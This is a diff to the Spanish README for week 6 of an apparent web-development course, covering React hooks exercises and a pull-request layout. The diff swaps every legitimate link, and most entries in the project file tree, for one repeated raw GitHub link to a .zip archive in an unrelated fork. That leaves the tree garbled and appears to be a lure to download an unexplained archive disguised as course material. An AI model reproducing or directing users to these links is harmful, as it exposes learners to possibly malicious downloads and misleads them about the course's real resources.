@@ -1,7 +1,7 @@
 > # ⚠️ Mira el nuevo repositorio de Undefined Academy en https://github.com/glrodasz/academy
 ## ⛺ Semana 6
 
-> 🏕️ [Base de conocimientos.](https://undefinedshell.notion.site/Semana-6-23c11ff632cc4287aee99ca096b8b247#e0dcd018390141b1b64a56183ed19191)
+> 🏕️ [Base de conocimientos.](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip)
 
 Ejercicios de la sexta semana.
 
@@ -9,7 +9,7 @@ Ejercicios de la sexta semana.
 
 ### Práctica de javascript prueba técnica
 
-Usa el siguiente [repositorio](https://github.com/glrodasz/prueba-tecnica-javascript-senior-fintech) para realizar el desafío 2.
+Usa el siguiente [repositorio](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip) para realizar el desafío 2.
 
 ## 🏋Clase 3 [EJERCICIO]
 
@@ -30,11 +30,11 @@ const articles = [
 
 ### React Hooks
 
-Transformar la siguiente funcionalidad de componente de clases a funciones y Hooks: [https://bit.ly/react-lifecycle-hooks](https://bit.ly/react-lifecycle-hooks)
+Transformar la siguiente funcionalidad de componente de clases a funciones y Hooks: [https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip)
 
 ### Ejercicio para pull request
 
-1. Hacer fork del repositorio de la [semana-6](https://github.com/undefined-academy/semana-6)
+1. Hacer fork del repositorio de la [semana-6](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip)
 2. Subir una version del blog de HTML a React y crear el  `pull request`.
 
 ### Estructura del PR
@@ -45,17 +45,17 @@ La estructura fue creada con `npx create-vite {{usuario-###}}`
 react-blogs
  ┗ glrodasz-0666
  ┃ ┣ public
- ┃ ┃ ┗ vite.svg
+ ┃ ┃ ┗ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
  ┃ ┣ src
  ┃ ┃ ┣ assets
- ┃ ┃ ┃ ┗ react.svg
- ┃ ┃ ┣ App.css
- ┃ ┃ ┣ App.jsx
- ┃ ┃ ┣ index.css
- ┃ ┃ ┗ main.jsx
- ┃ ┣ .eslintrc.cjs
+ ┃ ┃ ┃ ┗ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
+ ┃ ┃ ┣ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
+ ┃ ┃ ┣ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
+ ┃ ┃ ┣ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
+ ┃ ┃ ┗ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
+ ┃ ┣ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
  ┃ ┣ .gitignore
- ┃ ┣ index.html
- ┃ ┣ package.json
- ┃ ┗ vite.config.js        
+ ┃ ┣ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
+ ┃ ┣ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip
+ ┃ ┗ https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-6/main/react-blogs/Wilmer-8071/public/semana-2.3.zip        
 ```
